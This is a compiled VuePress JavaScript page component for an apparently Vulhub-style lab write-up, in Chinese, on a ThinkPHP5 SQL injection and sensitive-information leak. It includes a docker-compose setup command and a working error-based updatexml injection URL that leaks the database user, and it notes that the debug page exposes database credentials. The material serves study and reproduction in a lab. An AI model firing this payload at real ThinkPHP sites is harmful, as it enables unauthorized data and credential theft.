import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as r,c as s,a as e,b as a,d as n,e as c}from"./app-58e4a7d6.js";const d={},l=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"漏洞原理说明：",-1),h={href:"https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html",target:"_blank",rel:"noopener noreferrer"},_={href:"https://xz.aliyun.com/t/125",target:"_blank",rel:"noopener noreferrer"},u=c(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>运行环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>启动后，访问 <code>http://your-ip/index.php?ids[]=1&amp;ids[]=2</code>，即可看到用户名被显示了出来，说明环境运行成功。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>访问 <code>http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</code>，信息成功被爆出：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021518532.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>当然，这是一个比较鸡肋的 SQL 注入漏洞。但通过 DEBUG 页面，我们找到了数据库的账号、密码：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021518495.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这又属于一个敏感信息泄露漏洞。</p>`,10);function m(f,g){const t=o("ExternalLinkIcon");return r(),s("div",null,[l,p,e("ul",null,[e("li",null,[e("a",h,[a("https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html"),n(t)])]),e("li",null,[e("a",_,[a("https://xz.aliyun.com/t/125"),n(t)])])]),u])}const k=i(d,[["render",m],["__file","ThinkPHP5 SQL注入漏洞 __ 敏感信息泄露.html.vue"]]);export{k as default};
